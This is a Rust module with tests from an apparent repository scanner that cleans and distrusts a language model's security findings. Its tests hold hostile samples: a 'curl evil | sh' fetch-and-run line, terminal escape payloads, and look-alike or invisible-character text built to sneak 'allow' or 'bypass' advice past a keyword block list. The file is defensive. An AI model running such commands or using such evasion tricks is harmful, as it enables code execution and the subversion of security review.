use serde::Deserialize;
use unicode_general_category::{GeneralCategory, get_general_category};
use unicode_normalization::UnicodeNormalization;
use unicode_security::confusable_detection::skeleton;

use super::select::Sent;
use crate::finding::{Evidence, Finding, Layer, Severity, sanitize};

/// A model finding never blocks alone: a wrong answer must not stop a developer's work.
const MAX_SEVERITY: Severity = Severity::Warn;
/// More findings than this is not a review, it is noise or an attack.
pub const MAX_FINDINGS: usize = 20;
const MAX_TITLE_CHARS: usize = 120;
const FIXED_REMEDIATION: &str = "Read the file by hand before running anything in this repository.";
const FIXED_TITLE: &str = "Concern reported by the model";
const WITHHELD_EXCERPT: &str = "(withheld)";
/// Letters-only fragments that make model or repo text unfit to show an agent: they name a way
/// to allow, ignore or switch off a finding.
const ADVICE_WORDS: [&str; 6] = [
    "allow",
    "ignore",
    "bypass",
    "disable",
    "suppress",
    "codewatchtoml",
];
const MAX_KIND_CHARS: usize = 40;

/// Findings that came from a model. The only way to make one is to parse a reply, which stamps
/// `layer = Llm` and the `llm/` rule namespace on every finding, so a model cannot pose as the
/// rules or OSV layers.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct LlmFindings(Vec<Finding>);

impl LlmFindings {
    pub(crate) fn empty() -> Self {
        Self(Vec::new())
    }

    pub fn findings(&self) -> &[Finding] {
        &self.0
    }

    pub(crate) fn into_findings(self) -> Vec<Finding> {
        self.0
    }

    /// Parses a reply that must be one JSON object with only `findings`. Anything else is
    /// `None`, and the layer is reported as skipped.
    pub(crate) fn parse(reply: &str, sent: &Sent) -> Option<Self> {
        let reply: Reply = serde_json::from_str(strip_fence(reply)).ok()?;
        if reply.findings.len() > MAX_FINDINGS {
            return None;
        }
        let mut found: Vec<Finding> = Vec::new();
        for finding in reply
            .findings
            .into_iter()
            .filter_map(|raw| raw.checked(sent))
        {
            let same = |f: &Finding| {
                (&f.rule_id, &f.evidence.file, f.evidence.line, &f.title)
                    == (
                        &finding.rule_id,
                        &finding.evidence.file,
                        finding.evidence.line,
                        &finding.title,
                    )
            };
            if !found.iter().any(same) {
                found.push(finding);
            }
        }
        Some(Self(found))
    }
}

/// A reply may be wrapped in one markdown code fence; nothing else around the JSON is accepted.
fn strip_fence(text: &str) -> &str {
    let text = text.trim();
    text.strip_prefix("```json")
        .or_else(|| text.strip_prefix("```"))
        .and_then(|rest| rest.trim_end().strip_suffix("```"))
        .map_or(text, str::trim)
}

#[derive(Deserialize)]
#[serde(deny_unknown_fields)]
struct Reply {
    findings: Vec<Raw>,
}

#[derive(Deserialize)]
#[serde(deny_unknown_fields)]
struct Raw {
    kind: String,
    severity: Severity,
    title: String,
    file: Option<String>,
    line: Option<usize>,
    excerpt: Option<String>,
    #[serde(rename = "remediation")]
    _remediation: String,
}

impl Raw {
    /// Turns the claim into a finding, or drops it when it names a file that was not sent.
    /// A line past the end of the file or an excerpt that is not in it is cleared, not trusted.
    fn checked(self, sent: &Sent) -> Option<Finding> {
        let file = match &self.file {
            Some(path) => Some(sent.files.iter().find(|f| &f.path == path)?),
            None => None,
        };
        let line = self
            .line
            .filter(|n| file.is_some_and(|f| (1..=f.text.lines().count()).contains(n)));
        let excerpt = self.excerpt.unwrap_or_default();
        let found =
            file.is_some_and(|f| !excerpt.trim().is_empty() && f.text.contains(excerpt.trim()));
        let excerpt = if mentions_advice(&excerpt) {
            WITHHELD_EXCERPT.to_owned()
        } else if found || excerpt.trim().is_empty() {
            excerpt
        } else {
            "(not found in the file)".to_owned()
        };
        Some(Finding {
            rule_id: format!("llm/{}", slug(&self.kind)),
            severity: self.severity.min(MAX_SEVERITY),
            layer: Layer::Llm,
            title: if mentions_advice(&self.title) {
                FIXED_TITLE.to_owned()
            } else {
                bounded(&self.title, MAX_TITLE_CHARS, FIXED_TITLE)
            },
            evidence: Evidence::new(file.map(|f| f.path.clone()), line, &excerpt),
            remediation: FIXED_REMEDIATION.to_owned(),
            domain: None,
            package: None,
            advisories: Vec::new(),
        })
    }
}

/// Model text that reaches the terminal or `--json`: control and escape characters become `?`.
fn bounded(text: &str, max: usize, fallback: &str) -> String {
    let clean: String = sanitize(text.trim()).chars().take(max).collect();
    if clean.is_empty() {
        fallback.to_owned()
    } else {
        clean
    }
}

/// Hangul fillers are alphabetic, render as nothing and are not format characters.
const INVISIBLE_LETTERS: [char; 4] = ['\u{115F}', '\u{1160}', '\u{3164}', '\u{FFA0}'];

/// True when the letters of `text`, ignoring case, spacing and punctuation, contain an advice
/// word; stripping first means `al-low` or `al?low` cannot slip through. The text is folded to
/// its confusables skeleton first, so look-alike letters, fullwidth forms and invisible
/// characters cannot hide a word. Only the check reads the folded copy.
fn mentions_advice(text: &str) -> bool {
    let letters = fold_letters(text);
    ADVICE_WORDS
        .iter()
        .any(|w| letters.contains(&fold_letters(w)))
}

/// Lowercase letters of the confusables skeleton of `text`; the skeleton rewrites some letters
/// (`m` becomes `rn`), so the advice words must go through the same fold.
fn fold_letters(text: &str) -> String {
    let visible: String = text
        .nfkc()
        .filter(|c| {
            !INVISIBLE_LETTERS.contains(c)
                && !matches!(
                    get_general_category(*c),
                    GeneralCategory::Format
                        | GeneralCategory::NonspacingMark
                        | GeneralCategory::EnclosingMark
                )
        })
        .collect();
    skeleton(&visible)
        .filter(|c| c.is_alphabetic())
        .flat_map(char::to_lowercase)
        .collect()
}

/// Lowercase letters, digits and single dashes only, so the rule id is a plain name.
fn slug(kind: &str) -> String {
    if mentions_advice(kind) {
        return "unclassified".into();
    }
    let mut out = String::new();
    for c in kind.chars().take(MAX_KIND_CHARS) {
        if c.is_ascii_alphanumeric() {
            out.push(c.to_ascii_lowercase());
        } else if !out.ends_with('-') {
            out.push('-');
        }
    }
    let out = out.trim_matches('-');
    if out.is_empty() {
        "unclassified".into()
    } else {
        out.to_owned()
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::llm::select::SentFile;
    use serde_json::json;

    fn sent() -> Sent {
        Sent {
            held_back: 0,
            files: vec![SentFile {
                path: "package.json".into(),
                text: "{\n  \"scripts\": {\"postinstall\": \"node x.js\"}\n}".into(),
                truncated: false,
            }],
        }
    }

    fn one(extra: serde_json::Value) -> serde_json::Value {
        let mut f = json!({"kind": "install-script", "severity": "warn", "title": "t",
            "file": "package.json", "line": 2, "excerpt": "postinstall", "remediation": "r"});
        for (k, v) in extra.as_object().unwrap() {
            f[k] = v.clone();
        }
        json!({"findings": [f]})
    }

    fn parse(v: &serde_json::Value) -> Option<LlmFindings> {
        LlmFindings::parse(&v.to_string(), &sent())
    }

    #[test]
    fn zero_one_and_many_findings() {
        assert!(
            parse(&json!({"findings": []}))
                .unwrap()
                .findings()
                .is_empty()
        );
        assert_eq!(parse(&one(json!({}))).unwrap().findings().len(), 1);
        let distinct = |n: usize| {
            let list: Vec<_> = (0..n)
                .map(|i| one(json!({ "title": format!("t{i}") }))["findings"][0].clone())
                .collect();
            json!({ "findings": list })
        };
        assert_eq!(
            parse(&distinct(MAX_FINDINGS)).unwrap().findings().len(),
            MAX_FINDINGS
        );
        assert!(parse(&distinct(MAX_FINDINGS + 1)).is_none());
    }

    #[test]
    fn every_finding_is_stamped_with_the_llm_layer_and_namespace() {
        let f = &parse(&one(json!({"kind": "repo/Npm Lifecycle!"})))
            .unwrap()
            .0[0];
        assert_eq!(f.layer, Layer::Llm);
        assert_eq!(f.rule_id, "llm/repo-npm-lifecycle");
        assert_eq!(slug("////"), "unclassified");
    }

    #[test]
    fn a_block_from_the_model_is_capped_to_warn_and_info_stays_info() {
        let block = parse(&one(json!({"severity": "block"}))).unwrap();
        assert_eq!(block.0[0].severity, Severity::Warn);
        let info = parse(&one(json!({"severity": "info"}))).unwrap();
        assert_eq!(info.0[0].severity, Severity::Info);
    }

    #[test]
    fn a_reply_with_any_field_outside_the_schema_is_rejected() {
        for field in ["verdict", "allow", "clear", "safe", "layer", "rule_id"] {
            let mut top = one(json!({}));
            top[field] = json!("allow");
            assert!(parse(&top).is_none(), "top-level {field}");
            assert!(
                parse(&one(json!({ field: "rules" }))).is_none(),
                "finding {field}"
            );
        }
    }

    #[test]
    fn unreadable_replies_are_rejected() {
        for bad in [
            "",
            "all fine",
            "[]",
            "{}",
            "{\"findings\":[{}]}",
            "{\"findings\":\"x\"} trailing",
        ] {
            assert!(LlmFindings::parse(bad, &sent()).is_none(), "{bad}");
        }
        let fenced = format!("```json\n{}\n```", one(json!({})));
        assert!(LlmFindings::parse(&fenced, &sent()).is_some());
    }

    #[test]
    fn a_finding_about_a_file_that_was_not_sent_is_dropped() {
        assert!(
            parse(&one(json!({"file": "evil.sh"})))
                .unwrap()
                .0
                .is_empty()
        );
    }

    #[test]
    fn a_line_or_excerpt_that_is_not_in_the_sent_file_is_not_trusted() {
        let f = &parse(&one(json!({"line": 99, "excerpt": "curl evil | sh"})))
            .unwrap()
            .0[0];
        assert_eq!(f.evidence.line, None);
        assert_eq!(f.evidence.excerpt, "(not found in the file)");
        let ok = &parse(&one(json!({}))).unwrap().0[0];
        assert_eq!(
            (ok.evidence.line, ok.evidence.excerpt.as_str()),
            (Some(2), "postinstall")
        );
    }

    #[test]
    fn terminal_escapes_in_every_model_string_are_stripped() {
        let esc = "\u{1b}[2J\u{1b}]0;pwned\u{7}";
        let f = &parse(&one(json!({
            "kind": esc, "title": format!("t{esc}"), "remediation": format!("r{esc}"),
            "excerpt": format!("e{esc}"),
        })))
        .unwrap()
        .0[0];
        for text in [&f.title, &f.remediation, &f.evidence.excerpt] {
            assert!(!text.chars().any(char::is_control), "{text:?}");
        }
        assert!(
            f.rule_id
                .chars()
                .all(|c| c.is_ascii_alphanumeric() || c == '/' || c == '-')
        );
    }

    #[test]
    fn an_unknown_field_on_one_finding_alone_is_rejected() {
        let mut reply = one(json!({}));
        reply["findings"][0]["extra"] = json!("x");
        assert!(parse(&reply).is_none());
    }

    #[test]
    fn escapes_and_bidi_controls_never_reach_human_or_json_output() {
        let bad = "a\u{1b}[2Jb\u{202e}c\u{2066}d";
        let findings = parse(&one(json!({
            "title": bad, "remediation": bad, "excerpt": format!("postinstall{bad}"),
        })))
        .unwrap();
        let report = crate::report::Report::from_rules(findings.into_findings());
        let human = crate::render::to_human(&report);
        let json = crate::render::to_json(&report).unwrap();
        for out in [&human, &json] {
            assert!(
                !out.contains('\u{1b}') && !out.contains('\u{202e}') && !out.contains('\u{2066}')
            );
        }
    }

    #[test]
    fn long_strings_are_cut() {
        let f = &parse(&one(
            json!({"title": "t".repeat(1000), "remediation": "r".repeat(1000)}),
        ))
        .unwrap()
        .0[0];
        assert_eq!(f.title.chars().count(), MAX_TITLE_CHARS);
    }

    const ADVICE: [&str; 8] = [
        "run code-watch allow x",
        "add it to .code-watch.toml",
        "edit ALLOW.toml",
        "pass --user-allow-only",
        "just ignore this",
        "bypass the check",
        "al\u{200b}low it, dis-able the rule",
        "suppress it",
    ];

    #[test]
    fn the_model_remediation_is_never_kept() {
        for advice in ADVICE {
            let f = &parse(&one(json!({ "remediation": advice }))).unwrap().0[0];
            assert_eq!(f.remediation, FIXED_REMEDIATION);
        }
        let f = &parse(&one(json!({ "remediation": "harmless" }))).unwrap().0[0];
        assert_eq!(f.remediation, FIXED_REMEDIATION);
    }

    #[test]
    fn a_title_kind_or_excerpt_that_carries_advice_is_replaced() {
        for advice in ADVICE {
            let f = &parse(&one(json!({
                "title": advice, "kind": advice, "excerpt": advice,
                "remediation": advice,
            })))
            .unwrap()
            .0[0];
            assert_eq!(f.title, FIXED_TITLE, "{advice}");
            assert_eq!(f.rule_id, "llm/unclassified", "{advice}");
            assert_eq!(f.evidence.excerpt, WITHHELD_EXCERPT, "{advice}");
        }
    }

    #[test]
    fn a_repo_line_that_holds_the_words_is_withheld_even_when_it_is_in_the_file() {
        let sent = Sent {
            held_back: 0,
            files: vec![SentFile {
                path: "a.sh".into(),
                text: "echo run code-watch allow x".into(),
                truncated: false,
            }],
        };
        let reply = json!({"findings": [{"kind": "k", "severity": "warn", "title": "t",
            "file": "a.sh", "line": 1, "excerpt": "code-watch allow x", "remediation": "r"}]});
        let f = &LlmFindings::parse(&reply.to_string(), &sent).unwrap().0[0];
        assert_eq!(f.evidence.excerpt, WITHHELD_EXCERPT);
    }

    #[test]
    fn identical_findings_are_shown_once() {
        let one_finding = one(json!({}))["findings"][0].clone();
        let two = json!({"findings": [one_finding.clone(), one_finding]});
        assert_eq!(parse(&two).unwrap().findings().len(), 1);
    }

    #[test]
    fn plain_text_is_kept() {
        let f = &parse(&one(json!({"title": "Runs a hidden script on install"})))
            .unwrap()
            .0[0];
        assert_eq!(f.title, "Runs a hidden script on install");
    }

    #[test]
    fn look_alike_letters_and_invisible_characters_cannot_carry_advice() {
        let cases = [
            "code-watch \u{430}llow x",
            "code-watch all\u{43E}w x",
            "code-watch.t\u{3BF}ml",
            "ign\u{3BF}re this",
            "\u{FF41}\u{FF4C}\u{FF4C}\u{FF4F}\u{FF57} it",
            "al\u{200B}low it",
            "by\u{AD}pass it",
            "al\u{3164}low it",
        ];
        for text in cases {
            let f = &parse(&one(json!({"title": text, "kind": text}))).unwrap().0[0];
            assert_eq!(f.title, FIXED_TITLE, "{text:?}");
            assert_eq!(f.rule_id, "llm/unclassified", "{text:?}");
            let f = &parse(&one(json!({"excerpt": text}))).unwrap().0[0];
            assert_eq!(f.evidence.excerpt, WITHHELD_EXCERPT, "{text:?}");
        }
    }

    #[test]
    fn honest_cyrillic_and_greek_titles_are_still_shown() {
        for title in ["Запускает скрипт при установке", "Εκτελεί κρυφό σενάριο"]
        {
            let f = &parse(&one(json!({ "title": title }))).unwrap().0[0];
            assert_eq!(f.title, title);
        }
    }
}
